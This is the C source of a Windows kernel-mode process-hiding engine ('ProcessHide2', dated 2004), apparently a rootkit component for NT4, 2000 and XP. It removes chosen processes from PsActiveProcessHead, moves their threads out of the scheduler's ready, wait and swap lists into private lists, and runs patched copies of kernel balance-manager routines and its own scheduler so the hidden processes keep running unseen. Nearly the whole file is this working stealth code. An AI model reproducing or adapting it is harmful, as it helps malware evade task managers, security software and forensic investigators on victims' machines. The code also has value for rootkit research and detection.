/*++

Module Name:

    phide2.c

Abstract:

    ProcessHide2 engine.

Author:

    90210 7-Dec-2004

--*/

//#define DEBUG

#include "phide2.h"

static KEVENT	g_ShutdownEvent;
static KTIMER	g_MoveTimer;
static KTIMER	g_QuantumTimer;
static PETHREAD	g_PhideThreads[NUMBER_OF_THREADS]={0};
static PVOID	g_NewCode=NULL;
static ULONG	g_NewCodeSize=0;

static ISPROCESSHIDDEN_CALLBACK	g_IsProcessHidden=NULL;

static SCHEDULER_LISTS_RVAS	ListsRVAs;
static SCHEDULER_LISTS	NewLists;

static BOOLEAN	g_DoublyLinkedList[sizeof(SCHEDULER_LISTS_RVAS)/sizeof(ULONG)]={TRUE,TRUE,TRUE,TRUE,TRUE,TRUE};

static PULONG	g_NewKiReadySummary=NULL;
static PULONG	g_NewKiReadyQueueIndex=NULL;
static PULONG	g_NewKiSwappingThread=NULL;
static PULONG	g_NewKiStackOutSwapRequest=NULL;
static PKEVENT	g_NewKiSwapEvent=NULL;

static ULONG	g_NtoskrnlIbase=0;
BOOLEAN	g_bCheckedBuild=FALSE;
ULONG	g_MajorVersion=0, g_MinorVersion=0;

static PLIST_ENTRY	g_PsActiveProcessHead=NULL;


static PSTRUCTURE_OFFSETS	g_pStructureOffsets=0;
static STRUCTURE_OFFSETS	g_Offsets_NT={0x44, 0x5c, 0x48, 0x98},
							g_Offsets_2k={0x44, 0x5c, 0x48, 0xa0},
							g_Offsets_XP={0x44, 0x60, 0x48, 0x88};



extern WANTED_SYMBOLS	RVAs;

#ifdef DEBUG
static PCHAR	pszWantedSymbols[]={
			"KeBalanceSetManager",
			"KeSwapProcessOrStack",
			"NtYieldExecution",
			"KiDispatcherReadyListHead",
			"WaitList1",
			"WaitList2",
			"KiStackInSwapListHead",
			"BalmgrList1",
			"BalmgrList2",
			"BalmgrList3",
			"KiReadySummary",
			"KiReadyQueueIndex",
			"KiSwapEvent",
			"KiStackOutSwapRequest",
			"KiSwappingThread",
			"PsActiveProcessHead"
};
#endif


static struct {
	PROC	NtYieldExecution;	
	BALMGR_FUNC	KeBalanceSetManager;
	BALMGR_FUNC	KeSwapProcessOrStack;
	KWFMO_FUNC	KeWaitForMultipleObjects;
} CodeEntries;

static IMPORT_ENTRY	Import[]={
							{NULL,IMPORT_BY_RVA},							
							{NULL,IMPORT_BY_RVA},
							{NULL,IMPORT_BY_RVA},
							{"KeWaitForMultipleObjects",IMPORT_BY_NAME},
							{NULL,0}
							};


static ULONG GetNtoskrnlIbase()
{
	NTSTATUS	rc;
	ULONG	dwNeededSize,Ibase;
	PMODULES	pModules=(PMODULES)&pModules;

	// get system modules - ntoskrnl is always first there
	rc=ZwQuerySystemInformation(SystemModuleInformation,pModules,4,&dwNeededSize);
	if (rc==STATUS_INFO_LENGTH_MISMATCH) {
		pModules=ExAllocatePool(PagedPool,dwNeededSize);
		RtlZeroMemory(pModules,dwNeededSize);
		rc=ZwQuerySystemInformation(SystemModuleInformation,pModules,dwNeededSize,NULL);
	} else {
strange:
		return 0;
	}
	
	if (!NT_SUCCESS(rc)) goto strange;
	
	Ibase=(ULONG)pModules->smi.Base;
	ExFreePool(pModules);

	return Ibase;
}

static VOID FixrelocsCallback(PUCHAR pImage,PULONG pFixedAddress,ULONG OriginalFixupRva,ULONG TargetRva)
{
	ULONG i,dwDiff;

	for (i=0;i<sizeof(ListsRVAs)/sizeof(ULONG);i++) {
		// patch new listheads
		if (TargetRva==((PULONG)&ListsRVAs)[i]) {
#ifdef DEBUG
			DbgPrint("Patching .%08X.Flink (list #%d), original RVA was .%08X\n",TargetRva,i,OriginalFixupRva);
#endif
			*pFixedAddress=(ULONG)&((PLIST_ENTRY*)&NewLists)[i]->Flink;
		}

		// process Blinks only if this list is doubly linked
		if ((TargetRva==((PULONG)&ListsRVAs)[i]+(sizeof(LIST_ENTRY)>>1)) &&
			g_DoublyLinkedList[i]) {
#ifdef DEBUG
			DbgPrint("Patching .%08X.Blink (list #%d), original RVA was .%08X\n",TargetRva,i,OriginalFixupRva);
#endif
			*pFixedAddress=(ULONG)&((PLIST_ENTRY*)&NewLists)[i]->Blink;
		}
	}

	// patch KiReadySummary, KiReadyQueueIndex, KiStackOutSwapRequest and KiSwappingThread
	if (TargetRva==RVAs.KiReadySummary) {
#ifdef DEBUG
		DbgPrint("Patching link to KiReadySummary, original RVA was .%08X\n",OriginalFixupRva);
#endif
		*pFixedAddress=(ULONG)g_NewKiReadySummary;
	}
	if (TargetRva==RVAs.KiReadyQueueIndex) {
#ifdef DEBUG
		DbgPrint("Patching link to KiReadyQueueIndex, original RVA was .%08X\n",OriginalFixupRva);
#endif
		*pFixedAddress=(ULONG)g_NewKiReadyQueueIndex;
	}
	if (TargetRva==RVAs.KiStackOutSwapRequest) {
#ifdef DEBUG
		DbgPrint("Patching link to KiStackOutSwapRequest, original RVA was .%08X\n",OriginalFixupRva);
#endif
		*pFixedAddress=(ULONG)g_NewKiStackOutSwapRequest;
	}
	if ((TargetRva==RVAs.KiSwappingThread) && RVAs.KiSwappingThread) {
#ifdef DEBUG
		DbgPrint("Patching link to KiSwappingThread, original RVA was .%08X\n",OriginalFixupRva);
#endif
		*pFixedAddress=(ULONG)g_NewKiSwappingThread;
	}

	// patch KiSwapEvent field addressing
	dwDiff=TargetRva-RVAs.KiSwapEvent;
	if (dwDiff<sizeof(KEVENT)) {
#ifdef DEBUG
		DbgPrint("Patching link to KiSwapEvent.%02X, original RVA was .%08X\n",dwDiff,OriginalFixupRva);
#endif
		*pFixedAddress=dwDiff+(ULONG)g_NewKiSwapEvent;
	}

	return;
}

static VOID MoveHiddenThreads(PLIST_ENTRY RealListHead,PLIST_ENTRY NewListHead,BOOLEAN bDoublyLinkedList)
{
	PLIST_ENTRY	NextEntry,Prev,tmp;
	PETHREAD	Thread;
	PEPROCESS	Process;

	try {
	
		Prev=RealListHead;
		NextEntry=RealListHead->Flink;
	
		// do checks for singly and doubly linked lists
		while ((NextEntry!=RealListHead) && NextEntry) {
			// CONTAINING_RECORD replacement
			Thread=(PETHREAD)((PUCHAR)NextEntry-g_pStructureOffsets->ET_WaitListEntry);
			tmp=NextEntry->Flink;

			// get thread's process
			Process=*(PEPROCESS*)((PUCHAR)Thread+g_pStructureOffsets->ET_ApcState_Process);
			if (g_IsProcessHidden(Process)) {
#ifdef DEBUG
				DbgPrint("EPROCESS %08X (thread %08X) removed from one of threads lists\n",Process,Thread);
#endif
				if (bDoublyLinkedList) {
					RemoveEntryList(NextEntry);
					InsertTailList(NewListHead,NextEntry);
				} else {
					// singly linked list
					Prev->Flink=NextEntry->Flink;
					PushEntryList((PSINGLE_LIST_ENTRY)NewListHead,(PSINGLE_LIST_ENTRY)NextEntry);
				}
			}
			NextEntry=tmp;
		}
	
	} except(EXCEPTION_EXECUTE_HANDLER) {
	}
		
	return;
}

static VOID MoveHiddenProcesses(PLIST_ENTRY RealListHead,PLIST_ENTRY NewListHead,BOOLEAN bDoublyLinkedList)
{
	PLIST_ENTRY	NextEntry,Prev,tmp;
	PEPROCESS	Process;

	try {
	
		Prev=RealListHead;
		NextEntry=RealListHead->Flink;
	
		// do checks for singly and doubly linked lists
		while ((NextEntry!=RealListHead) && NextEntry) {
			// CONTAINING_RECORD replacement
			Process=(PEPROCESS)((PUCHAR)NextEntry-g_pStructureOffsets->EP_SwapListEntry);
			tmp=NextEntry->Flink;

			if (g_IsProcessHidden(Process)) {
#ifdef DEBUG
				DbgPrint("EPROCESS %08X removed from one of process list\n",Process);
#endif
				if (bDoublyLinkedList) {
					RemoveEntryList(NextEntry);
					InsertTailList(NewListHead,NextEntry);
				} else {
					// singly linked list
					Prev->Flink=NextEntry->Flink;
					PushEntryList((PSINGLE_LIST_ENTRY)NewListHead,(PSINGLE_LIST_ENTRY)NextEntry);
				}
			}
			NextEntry=tmp;
		}
	
	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

	return;
}

static VOID MoveHiddenObjectsToNewLists()
{
	KIRQL	OldIrql;	
	ULONG	i;
	PLIST_ENTRY	RealListHead;
	PULONG	RealKiReadySummary;
	PLIST_ENTRY	NextProcess,Next;
	PEPROCESS	Process;


	OldIrql=KeRaiseIrqlToDpcLevel();

	try {

		NextProcess=g_PsActiveProcessHead->Flink;

		while (NextProcess!=g_PsActiveProcessHead) {
			Next=NextProcess->Flink;

			Process=(PEPROCESS)((PUCHAR)NextProcess-g_pStructureOffsets->EP_ActiveProcessLinks);
			// exclude hidden process from PsActiveProcessHead list
			if (g_IsProcessHidden(Process)) {
#ifdef DEBUG
				DbgPrint("EPROCESS %08X removed from PsActiveProcessHead\n",Process);
#endif
				RemoveEntryList(NextProcess);
				InitializeListHead(NextProcess);
			}
			NextProcess=Next;
		}

		RealKiReadySummary=(PULONG)(g_NtoskrnlIbase+RVAs.KiReadySummary);
		*g_NewKiReadySummary=0;

		RealListHead=(PLIST_ENTRY)(g_NtoskrnlIbase+ListsRVAs.KiDispatcherReadyListHead);
	
		// move ready threads
		for (i=0;i<MAXIMUM_PRIORITY;i++) {
			// KiDispatcherReadyListHead lists are always doubly-linked
			MoveHiddenThreads(&RealListHead[i],&NewLists.KiDispatcherReadyListHead[i],TRUE);

			// correct old and new KiReadySummary
			if (IsListEmpty(&RealListHead[i]))
				ClearMember(i,*RealKiReadySummary);
			if (!IsListEmpty(&NewLists.KiDispatcherReadyListHead[i])) 
				SetMember(i,*g_NewKiReadySummary);
		}

		// move waiting threads
		for (i=0;i<NUMBER_OF_THREADS_LISTS;i++) {
			// xp has only KiWaitListHead
			if (!ListsRVAs.Threads[i]) continue;

			RealListHead=(PLIST_ENTRY)(g_NtoskrnlIbase+ListsRVAs.Threads[i]);		
			MoveHiddenThreads(RealListHead,NewLists.Threads[i],
								g_DoublyLinkedList[1+i]);
		}

		// move processes
		for (i=0;i<NUMBER_OF_PROCESSES_LISTS;i++) {
			RealListHead=(PLIST_ENTRY)(g_NtoskrnlIbase+ListsRVAs.Processes[i]);
			MoveHiddenProcesses(RealListHead,NewLists.Processes[i],
								g_DoublyLinkedList[1+NUMBER_OF_THREADS_LISTS+i]);
		}

	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

	KeLowerIrql(OldIrql);
	return;
}

static VOID FreeAllocatedMemory()
{
	ULONG	i,Pointer;
	KIRQL	OldIrql;

	try {
		if (NewLists.KiDispatcherReadyListHead) {
			MmFreeNonCachedMemory(NewLists.KiDispatcherReadyListHead,MAXIMUM_PRIORITY*sizeof(LIST_ENTRY));
			NewLists.KiDispatcherReadyListHead=NULL;
		}

		for (i=1;i<sizeof(NewLists)/sizeof(PLIST_ENTRY);i++)
			if (((PVOID*)&NewLists)[i]) {
				MmFreeNonCachedMemory(((PVOID*)&NewLists)[i],sizeof(LIST_ENTRY));
				((PVOID*)&NewLists)[i]=NULL;
			}

		if (g_NewKiReadySummary) {
			MmFreeNonCachedMemory(g_NewKiReadySummary,sizeof(ULONG));
			g_NewKiReadySummary=NULL;
		}

		if (g_NewKiReadyQueueIndex) {
			MmFreeNonCachedMemory(g_NewKiReadyQueueIndex,sizeof(ULONG));
			g_NewKiReadyQueueIndex=NULL;
		}
		
		if (g_NewKiStackOutSwapRequest) {
			MmFreeNonCachedMemory(g_NewKiStackOutSwapRequest,sizeof(ULONG));
			g_NewKiStackOutSwapRequest=NULL;
		}
		
		if (g_NewKiSwapEvent) {
			MmFreeNonCachedMemory(g_NewKiSwapEvent,sizeof(KEVENT)<<1);
			g_NewKiSwapEvent=NULL;
		}
	
		if (g_NewKiSwappingThread) {
			MmFreeNonCachedMemory(g_NewKiSwappingThread,sizeof(ULONG));
			g_NewKiSwappingThread=NULL;
		}

		if (g_NewCode && g_NewCodeSize) {
			MmFreeNonCachedMemory(g_NewCode,g_NewCodeSize);
			g_NewCode=NULL;
			g_NewCodeSize=0;
		}

	
	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

	return;
}

static NTSTATUS PrepareSchedulerCode(PUCHAR pImage)
{
	NTSTATUS	Status;
	ULONG	i;

	try {		
		// allocate new dispatcher ready list
		NewLists.KiDispatcherReadyListHead=MmAllocateNonCachedMemory(MAXIMUM_PRIORITY*sizeof(LIST_ENTRY));
		for (i=0;i<MAXIMUM_PRIORITY;i++)
			InitializeListHead(&NewLists.KiDispatcherReadyListHead[i]);

		// allocate other lists. skip first field in the NewLists (KiDispatcherReadyListHead)
		for (i=1;i<sizeof(NewLists)/sizeof(PLIST_ENTRY);i++) {
			((PVOID*)&NewLists)[i]=MmAllocateNonCachedMemory(sizeof(LIST_ENTRY));
			if (g_DoublyLinkedList[i])
				InitializeListHead(((PLIST_ENTRY*)&NewLists)[i]);
			else
				((PSINGLE_LIST_ENTRY*)&NewLists)[i]->Next=NULL;
		}

		g_NewKiReadySummary=MmAllocateNonCachedMemory(sizeof(ULONG));
		*g_NewKiReadySummary=0;

		g_NewKiReadyQueueIndex=MmAllocateNonCachedMemory(sizeof(ULONG));
		*g_NewKiReadyQueueIndex=1;

		g_NewKiStackOutSwapRequest=MmAllocateNonCachedMemory(sizeof(ULONG));
		*g_NewKiStackOutSwapRequest=0;

		// allocate a bit more memory - for future oses
		g_NewKiSwapEvent=MmAllocateNonCachedMemory(sizeof(KEVENT)<<1);
		// call function instead of macro here
		KeInitializeEvent(g_NewKiSwapEvent,SynchronizationEvent,FALSE);	

		// only xp and above have KiSwappingThread
		if (RVAs.KiSwappingThread) {
			g_NewKiSwappingThread=MmAllocateNonCachedMemory(sizeof(ULONG));
			*g_NewKiSwappingThread=0;
		} else
			g_NewKiSwappingThread=NULL;

		if (!NT_SUCCESS(Status=PullOutCode(Import,(PULONG)&CodeEntries,
											&(PUCHAR)g_NewCode,
											&g_NewCodeSize,
											pImage,
											FixrelocsCallback)))
			return Status;

		if (!g_NtoskrnlIbase) 
			if (!(g_NtoskrnlIbase=GetNtoskrnlIbase())) {
				return STATUS_NTOSKRNL_NOT_FOUND;
			}

		g_PsActiveProcessHead=(PLIST_ENTRY)(g_NtoskrnlIbase+RVAs.PsActiveProcessHead);

	} except(EXCEPTION_EXECUTE_HANDLER) {
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}

static VOID SchedulerThread(PVOID StartContext)
{
	LARGE_INTEGER	Interval;
	NTSTATUS	Status;
	SHORT	bShutdown;
	PVOID	WaitObjects[MaximumObject];	

	WaitObjects[TimerExpiration]=&g_QuantumTimer;
	WaitObjects[ShutdownEvent]=&g_ShutdownEvent;

	// every 0.01 seconds
	Interval.QuadPart=-(10*100*100);
	KeSetTimer(&g_QuantumTimer,Interval,NULL);

	for (bShutdown=FALSE;!bShutdown;) {

		Status = CodeEntries.KeWaitForMultipleObjects(MaximumObject,
						&WaitObjects[0],
						WaitAny,
						Executive,
						KernelMode,
						FALSE,
						NULL,
						NULL);
		
		switch (Status) {
			case TimerExpiration:
				
				// share next quantum between hidden threads
				CodeEntries.NtYieldExecution();

				KeSetTimer(&g_QuantumTimer,Interval,NULL);
				break;

			case ShutdownEvent:
				KeCancelTimer(&g_QuantumTimer);
				bShutdown=TRUE;
				break;
		}
	}
#ifdef DEBUG
	DbgPrint("phide2: shutting down scheduler\n");
#endif
	PsTerminateSystemThread(STATUS_SUCCESS);
}

static VOID ExcludeHiddenObjectsThread(PVOID StartContext)
{
	LARGE_INTEGER	Interval;
	NTSTATUS	Status;
	SHORT	bShutdown;
	PVOID	WaitObjects[MaximumObject];

	WaitObjects[TimerExpiration]=&g_MoveTimer;
	WaitObjects[ShutdownEvent]=&g_ShutdownEvent;

	// every 0.01 seconds
	Interval.QuadPart=-(10*100*100);
	KeSetTimer(&g_MoveTimer,Interval,NULL);

	for (bShutdown=FALSE;!bShutdown;) {

		Status = CodeEntries.KeWaitForMultipleObjects(MaximumObject,
						&WaitObjects[0],
						WaitAny,
						Executive,
						KernelMode,
						FALSE,
						NULL,
						NULL);
		
		switch (Status) {
			case TimerExpiration:

				// should be PASSIVE_LEVEL on exit
				MoveHiddenObjectsToNewLists();

				KeSetTimer(&g_MoveTimer,Interval,NULL);
				break;

			case ShutdownEvent:
				KeCancelTimer(&g_MoveTimer);
				bShutdown=TRUE;
				break;
		}
	}
#ifdef DEBUG
	DbgPrint("phide2: shutting down excluder\n");
#endif
	PsTerminateSystemThread(STATUS_SUCCESS);
}

static NTSTATUS PrepareOsSpecificStuff()
{
	g_bCheckedBuild=PsGetVersion(&g_MajorVersion,&g_MinorVersion,NULL,NULL);
	
	if ((g_MajorVersion>5) ||	// NT5 max
		(g_MajorVersion<4) ||	// NT4 min
		((g_MajorVersion==5) && (g_MinorVersion>1)))	// 2k3 not supported yet
		return STATUS_UNSUCCESSFUL;

	// Initialize a few EPROCESS and ETHREAD field offsets. They are hardcoded (hi Four-F ;)
	g_pStructureOffsets=&g_Offsets_2k;
	if (g_MajorVersion==4) 
		g_pStructureOffsets=&g_Offsets_NT;
	else
		if (g_MinorVersion==1) 
			g_pStructureOffsets=&g_Offsets_XP;

	return STATUS_SUCCESS;
}


static VOID ShutdownThread(PKEVENT Event,PETHREAD Thread)
{
	KeSetEvent(Event,0,FALSE);
	KeWaitForSingleObject(Thread,
			Executive,
			KernelMode,
			FALSE,
			NULL);
	return;
}

NTSTATUS ProcessHide(ISPROCESSHIDDEN_CALLBACK IsProcessHidden)
{
	HANDLE	hThread;
	NTSTATUS	status;
	LARGE_INTEGER	Interval;
	MODULE_INFORMATION	mi;
	ULONG	dwKernelBase,i,j;


	try {
		if (!IsProcessHidden) return STATUS_INVALID_PARAMETER;
		if (g_IsProcessHidden) return STATUS_ALREADY_STARTED;

		g_IsProcessHidden=IsProcessHidden;

		KeInitializeEvent(&g_ShutdownEvent,NotificationEvent,0);
		KeInitializeTimer(&g_MoveTimer);
		KeInitializeTimer(&g_QuantumTimer);

		if (!NT_SUCCESS(PrepareOsSpecificStuff())) {
#ifdef DEBUG
			DbgPrint("Unsupported OS\n");
#endif
			return STATUS_UNSUPPORTED_OS;
		}

		// find symbols

		if (!NT_SUCCESS(MapNtoskrnlImage(&mi,&dwKernelBase))) {
#ifdef DEBUG
			DbgPrint("Failed to map ntoskrnl\n");
#endif
			return STATUS_MAP_IMAGE_FAILED;
		}

		status=FindWantedSymbols(&mi);
		UnmapNtoskrnlImage(&mi);

		if (!NT_SUCCESS(status)) {
#ifdef DEBUG
			DbgPrint("Failed to locate all needed symbols\n");
#endif
			return STATUS_UNSUPPORTED_OS;
		}

#ifdef DEBUG
		// dump debug info
		for (i=0;i<sizeof(RVAs)>>2;i++)
			// if not xp, print both WaitLists; otherwise - only 1st
			if (!((&((PDWORD)&RVAs)[i]==&RVAs.WaitLists[1]) && !RVAs.WaitLists[1]))
				DbgPrint("RVAs.%s==.%08X\n",pszWantedSymbols[i],((PDWORD)&RVAs)[i]);
#endif

		// should go exactly in this order
		Import[0].szName=(PCHAR)RVAs.NtYieldExecution;
		Import[1].szName=(PCHAR)RVAs.KeBalanceSetManager;
		Import[2].szName=(PCHAR)RVAs.KeSwapProcessOrStack;

		ListsRVAs.KiDispatcherReadyListHead=RVAs.KiDispatcherReadyListHead;
		ListsRVAs.Threads[0]=RVAs.KiStackInSwapListHead;
		ListsRVAs.Threads[1]=RVAs.WaitLists[0];
		ListsRVAs.Threads[2]=RVAs.WaitLists[1];

		for (i=j=0;i<NUMBER_OF_PROCESSES_LISTS;i++,j++) {
			// skip zeroed balmgr list (that was KiStackInSwapListHead)
			if (!RVAs.BalmgrLists[j]) j++;
			ListsRVAs.Processes[i]=RVAs.BalmgrLists[j];
		
			// xp balmgr process lists (KiProcess[In,Out]SwapListHead) are singly linked
			if ((g_MajorVersion==5) && (g_MinorVersion==1))
				g_DoublyLinkedList[1+NUMBER_OF_THREADS_LISTS+i]=FALSE;
		}

		if ((g_MajorVersion==5) && (g_MinorVersion==1))
			for (i=0;i<sizeof(ListsRVAs)/sizeof(ULONG);i++)
				if (((PULONG)&ListsRVAs)[i]==RVAs.KiStackInSwapListHead)
					// xp KiStackInSwapListHead is singly linked
					g_DoublyLinkedList[i]=FALSE;

		// build new scheduler
		if (!NT_SUCCESS(status=PrepareSchedulerCode(NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to prepare scheduler code\n");
#endif
			FreeAllocatedMemory();
			return status;
		}

		// run new scheduler threads
		if (!NT_SUCCESS(status=PsCreateSystemThread(&hThread,
							(ACCESS_MASK)0L,
							NULL,
							0,
							NULL,
							ExcludeHiddenObjectsThread,
							NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to start ExcludeHiddenObjectsThread\n");
#endif
			FreeAllocatedMemory();
			return status;
		}

		// store its PETHREAD for the KeWaitForMultipleObjects in shutdown
		if (!NT_SUCCESS(status=ObReferenceObjectByHandle(hThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode,
							(PVOID*)&g_PhideThreads[0],
							NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to get thread object of the ExcludeHiddenObjectsThread\n");
#endif
			ZwClose(hThread);
			return status;
		}
		ZwClose(hThread);

		if (!NT_SUCCESS(PsCreateSystemThread(&hThread,
							(ACCESS_MASK)0L,
							NULL,
							0,
							NULL,
							CodeEntries.KeBalanceSetManager,
							NULL))) {
			// we cannot free memory here until ExcludeHiddenObjectsThread is finished.
			// signal ExcludeHiddenObjectsThread to terminate and wait for its shutdown.
#ifdef DEBUG
			DbgPrint("Failed to start patched KeBalanceSetManager thread\n");
#endif
			ShutdownThread(&g_ShutdownEvent,g_PhideThreads[0]);
			FreeAllocatedMemory();
			return status;
		}
		ZwClose(hThread);

		if (!NT_SUCCESS(PsCreateSystemThread(&hThread,
							(ACCESS_MASK)0L,
							NULL,
							0,
							NULL,
							CodeEntries.KeSwapProcessOrStack,
							NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to start patched KeSwapProcessOrStack thread\n");
#endif
			ShutdownThread(&g_ShutdownEvent,g_PhideThreads[0]);
			// we cannot free memory here because the patched copy of 
			// KeBalanceSetManager is running.
			return status;
		}
		ZwClose(hThread);

		// wait 0.1 second
		Interval.QuadPart=-(1*100*100*100);
		KeDelayExecutionThread(KernelMode,FALSE,&Interval);

		if (!NT_SUCCESS(PsCreateSystemThread(&hThread,
							(ACCESS_MASK)0L,
							NULL,
							0,
							NULL,
							SchedulerThread,
							NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to start SchedulerThread\n");
#endif
			ShutdownThread(&g_ShutdownEvent,g_PhideThreads[0]);
			return status;
		}

		if (!NT_SUCCESS(status=ObReferenceObjectByHandle(hThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode, 
							(PVOID*)&g_PhideThreads[1],
							NULL))) {
#ifdef DEBUG
			DbgPrint("Failed to get thread object of the SchedulerThread\n");
#endif
			ZwClose(hThread);
			ShutdownThread(&g_ShutdownEvent,g_PhideThreads[0]);
			return status;
		}
		ZwClose(hThread);
	

	} except(EXCEPTION_EXECUTE_HANDLER) {
#ifdef DEBUG
		DbgPrint("Caught exception\n");
#endif
		ShutdownPhide();
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS; 
}

NTSTATUS ShutdownPhide()
{
#ifdef DEBUG
	DbgPrint("Shutdown starts\n");
#endif
	// signal threads to terminate
	KeSetEvent(&g_ShutdownEvent,0,FALSE);

	if (g_PhideThreads[0] || g_PhideThreads[1])
		// wait for threads to terminate
		return KeWaitForMultipleObjects(NUMBER_OF_THREADS,
					(PVOID)&g_PhideThreads,
					WaitAll,
					Executive,
					KernelMode,
					FALSE,
					NULL,
					NULL);
	else
		return STATUS_UNSUCCESSFUL;
}
